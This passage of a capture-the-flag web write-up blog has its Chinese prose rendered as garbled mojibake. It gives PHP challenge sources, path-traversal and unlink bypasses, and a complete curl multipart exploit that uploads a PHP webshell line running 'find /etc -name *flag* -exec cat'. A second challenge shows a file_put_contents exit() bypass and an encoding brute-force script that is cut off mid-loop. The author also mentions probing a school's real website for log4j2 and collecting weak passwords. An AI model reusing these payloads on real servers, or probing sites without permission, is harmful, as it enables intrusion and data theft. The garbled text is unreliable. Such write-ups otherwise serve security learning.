&lt;span style="color:#111">$filename&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#00a8c8">empty&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">$_FILES&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#39;name&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span> &lt;span style="color:#75715e">// æ–‡ä»¶åå’ŒåŽç¼€åˆ†ç¦»
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">is_array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$filename&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// æˆ‘ä»¬ä¼ å…¥å’Œæ–‡ä»¶ç±»åž‹fileåŒåçš„æ•°ç»„ file[] 3ä¸ªå‚æ•°
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$filename&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">explode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;.&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$filename&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$ext&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$filename&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// å–çš„æ˜¯file[0]
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ext&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#111">$filename&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">count&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$filename&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]){&lt;/span> &lt;span style="color:#75715e">// filename[count(filename)-1]=file[2]
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;try again!!!&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// file[0]=/../amiz.php file[2]=222 file[1]=111
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$new_name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">string&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">100&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">999&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;.&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$ext&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// éšæœºæ–‡ä»¶å /../è·¯å¾„ç©¿è¶Šç»•è¿‡
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">move_uploaded_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_FILES&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#39;tmp_name&amp;#39;&lt;/span>&lt;span style="color:#111">],&lt;/span>&lt;span style="color:#111">$new_name&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$_&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;hello&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#75af00">substr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_&lt;/span>&lt;span style="color:#111">)[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">],&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">6&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">===&lt;/span>&lt;span style="color:#d88200">&amp;#39;@&amp;lt;?php&amp;#39;&lt;/span>&lt;span style="color:#111">){&lt;/span> &lt;span style="color:#75715e">// @&amp;lt;?php `find /etc -name *flag* -exec cat {} +`;
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">strpos&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$new_name&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">===&lt;/span>&lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">include&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;you can do it!&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">unlink&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$new_name&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// ç»•è¿‡ ../xyz.php æˆ–xyz.php/. ä¸ä¼šè¢«åˆ é™¤
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç»•è¿‡æ–¹å¼å‚è€ƒ-&amp;gt;&lt;a href="https://xi4or0uji.github.io/2018/11/06/2018%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/#web2">2018ä¸Šæµ·web2&lt;/a>&lt;/p>
&lt;p>ç„¶åŽæž„é€ phpçš„curlï¼Œä¸Šä¼ åˆ°uploadå¤„è®©å®ƒè§¦å‘ï¼ˆå¤ªå·§å¦™äº†å§~ ç®€ç›´æ˜¯å¤©ç±~&lt;/p>
&lt;p>æˆ‘çœ‹èµµå¸ˆå‚…æ˜¯ç”¨postmanç›´æŽ¥ç”Ÿæˆçš„payloadï¼Œå¯æ˜¯æˆ‘ç”Ÿæˆçš„è·Ÿä»–çš„ç‰ˆæœ¬çœ‹èµ·æ¥å®Œå…¨ä¸ä¸€æ ·ï¼Œå°‘äº†postè¯¥æœ‰çš„å¾ˆå¤šä¸œè¥¿ï¼Œæ¯”å¦‚åˆ†å‰²çº¿å•Šï¼Œæ–‡ä»¶ç±»åž‹å’Œå†…å®¹ä»€ä¹ˆçš„ï¼Œä¸çŸ¥é“ä¸ºå•¥&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211210111755666.png" alt="image-20211210111755666">&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#111">$curl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_init&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75af00">curl_setopt_array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#75af00">CURLOPT_URL&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://10.0.39.6/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_RETURNTRANSFER&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_ENCODING&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_MAXREDIRS&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_TIMEOUT&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">30&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_HTTP_VERSION&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">CURL_HTTP_VERSION_1_1&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_CUSTOMREQUEST&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;POST&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_POSTFIELDS&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;------WebKitFormBoundary7MA4YWxkTrZu0gW&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">Content-Disposition: form-data; name=&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">file&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">; filename=&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">amiz.php&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;\r\n&lt;/span>&lt;span style="color:#d88200">Content-Type: false&lt;/span>&lt;span style="color:#8045ff">\r\n\r\n&lt;/span>&lt;span style="color:#d88200">@&amp;lt;?php echo `find /etc -name *flag* -exec cat {} +`;&lt;/span>&lt;span style="color:#8045ff">\r\n\r\n&lt;/span>&lt;span style="color:#d88200">------WebKitFormBoundary7MA4YWxkTrZu0gW&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">Content-Disposition: form-data; name=&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">hello&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;\r\n\r\n&lt;/span>&lt;span style="color:#d88200">amiz.php&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">------WebKitFormBoundary7MA4YWxkTrZu0gW&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">Content-Disposition: form-data; name=&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">file[2]&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;\r\n\r\n&lt;/span>&lt;span style="color:#d88200">222&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">------WebKitFormBoundary7MA4YWxkTrZu0gW&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">Content-Disposition: form-data; name=&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">file[1]&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;\r\n\r\n&lt;/span>&lt;span style="color:#d88200">111&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">------WebKitFormBoundary7MA4YWxkTrZu0gW&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">Content-Disposition: form-data; name=&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">file[0]&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;\r\n\r\n&lt;/span>&lt;span style="color:#d88200">/../amiz.php&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">------WebKitFormBoundary7MA4YWxkTrZu0gW&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">Content-Disposition: form-data; name=&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">submit&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;\r\n\r\n&lt;/span>&lt;span style="color:#d88200">Submit&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">------WebKitFormBoundary7MA4YWxkTrZu0gW--&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_HTTPHEADER&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">&amp;#34;Postman-Token: a23f25ff-a221-47ef-9cfc-3ef4bd560c22&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;cache-control: no-cache&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;content-type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW&amp;#34;&lt;/span>
&lt;span style="color:#111">),&lt;/span>
&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#111">$response&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_exec&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$err&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">curl_close&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$err&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;cURL Error #:&amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$err&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$response&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¸Šä¼ åŽåˆ°/upload/s1.phpé¡µé¢å°±å¯ä»¥çœ‹åˆ°flagäº†&lt;/p>
&lt;p>ä¸Šé¢phpè¿˜æœ‰ä¸ªç»•è¿‡unlinkçš„åœ°æ–¹ï¼Œåœ¨n1çš„é¢˜é‡Œæ˜¯ç”¨ä¸€ä¸ª.shæ‰§è¡Œçš„åˆ é™¤å‘½ä»¤ï¼Œé‚£æ ·çš„è¯å¯ä»¥ç”¨&lt;code>-asdd.php&lt;/code>è¿™æ ·ç»•è¿‡ï¼Œå› ä¸ºå¼€å¤´æ˜¯ä¸ª&lt;code>-&lt;/code>&lt;/p>
&lt;p>â€”â€”â€”â€”â€”â€”æ€»ç»“ï¼šè‚¥è‚ å¤æ‚çš„ä¸€é“é¢˜ï¼Œæ‚æ‰äº†md5ç¢°æ’žã€SoapClientåŽŸç”Ÿç±»ååºåˆ—åŒ–ã€å†…ç½‘æ‰«æã€SSRFã€phpçš„trickç­‰ç­‰ä¸€ç³»åˆ—è€ƒç‚¹ï¼Œå°±åˆ«è¯´çŽ°åšäº†ï¼Œå°±æ˜¯å¤çŽ°çš„éš¾åº¦ä¹ŸæŒºé«˜çš„ï¼Œå¸ˆå‚…ä»¬ç‰›é€¼&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://xz.aliyun.com/t/6050#toc-10">wp1&lt;/a> | &lt;a href="https://www.zhaoj.in/read-6170.html#0x02ShellShellShell">wp2&lt;/a> | &lt;a href="https://xi4or0uji.github.io/2018/11/06/2018%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/#web2">wp11&lt;/a> | &lt;a href="https://cloud.tencent.com/developer/article/1360551">wp12&lt;/a>&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[WMCTF2020]Web Check in 2.0
&lt;/h4>
&lt;/summary>
&lt;p>æœ¬æ¥ä¸‹åˆ2ç‚¹å°±è¯¥å¼€å§‹åšçš„ï¼Œä½†æ˜¯ä¸‹åˆåŽ»è¯•å­¦æ ¡ç«™çš„log4j2äº†ï¼Œç»“æžœè¿™ä¸ªæ´žæ²¡è¯•å‡ºæ¥ æ‹¿äº†ä¸€äº›å¼±å£ä»¤ï¼Œæ— å¿ƒæ’æŸ³äº†å±žäºŽæ˜¯&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#75af00">string&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">62&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#d88200">&amp;#34;Sandbox:/var/www/html/sandbox/437a765460ed3657d5fb80d24456c9e5&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75715e">//PHP 7.0.33 Apache/2.4.25
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75af00">error_reporting&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$sandbox&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;/var/www/html/sandbox/&amp;#39;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#75af00">md5&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_SERVER&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;REMOTE_ADDR&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span> &lt;span style="color:#75715e">// æ²™ç›’ è·¯å¾„ç¡®å®š&amp;amp;å·²çŸ¥
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#75af00">mkdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$sandbox&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#75af00">chdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$sandbox&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Sandbox:&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$sandbox&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;content&amp;#39;&lt;/span>&lt;span style="color:#111">]))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$content&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;content&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/iconv|UCS|UTF|rot|quoted|base64/i&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$content&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#75715e">// ç¦äº†ä¸€äº›ä¼ªåè®®è¯»æ–‡ä»¶çš„ç¼–ç æ–¹å¼
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;hacker&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">file_exists&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$content&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">require_once&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$content&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// æ–‡ä»¶åŒ…å«
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">file_put_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$content&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;lt;?php exit();&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$content&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// æ­»äº¡exit()ç»•è¿‡
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¸€ç‚¹ç®€å•åˆ†æžå†™æ³¨é‡Šäº†ï¼Œé¦–å…ˆæ˜¯ä¼ªåè®®çš„éƒ¨åˆ†ï¼Œ&lt;code>file_put_contents()&lt;/code>æ”¯æŒä¼ªåè®®ï¼Œè€Œä¼ªåè®®å¤„ç†æ—¶è¦å…ˆurldecodeä¸€æ¬¡ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¼ å‚çš„æ—¶å€™å¯ä»¥å†ç¼–ä¸€æ¬¡ç &lt;/p>
&lt;p>å‡ºé¢˜äººçš„è¿™ç¯‡åšå®¢å†™çš„ç‰¹åˆ«è¯¦ç»†ï¼š&lt;a href="https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/">å…³äºŽfile_put_contentsçš„ä¸€äº›å°æµ‹è¯•&lt;/a>&lt;/p>
&lt;p>è¿œç¨‹çŽ¯å¢ƒä¸­&lt;code>%25&lt;/code>è¢«banäº†ï¼Œæˆ‘ä»¬å¯ä»¥å†™ä¸ªè„šæœ¬æž„é€ åˆ«çš„æ–¹å¼çš„2æ¬¡ç¼–ç ï¼Œæ¯”å¦‚&lt;code>%7%23&lt;/code>-&amp;gt;&lt;code>%72&lt;/code>-&amp;gt;&lt;code>r&lt;/code>å°±å¯ä»¥äº†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#111">$char&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">#æž„é€ rçš„äºŒæ¬¡ç¼–ç 
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ascii1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">$ascii1&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">256&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">$ascii1&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ascii2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">$ascii2&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">256&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">$ascii2&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$aaa&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;%&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$ascii1&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#39;%&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$ascii2&lt;/span>&lt;span style="color:#111">;&lt;/span>
